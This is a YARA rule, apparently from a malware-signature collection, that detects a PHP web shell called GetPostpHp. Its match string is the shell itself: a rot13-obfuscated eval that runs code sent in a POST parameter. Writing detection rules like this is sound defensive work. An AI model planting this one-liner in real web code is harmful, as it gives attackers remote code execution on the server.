rule webshell_GetPostpHp {
  meta:
    author = Spider
    comment = None
    date = 2014/03/28
    description = Web shells - generated from file GetPostpHp.php
    family = None
    hacker = None
    hash = 20ede5b8182d952728d594e6f2bb5c76
    judge = unknown
    license = https://creativecommons.org/licenses/by-nc/4.0/
    reference = None
    score = 70
    threatname = webshell[GetPostpHp
    threattype = GetPostpHp.yar
  strings:
    $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
  condition:
    all of them
}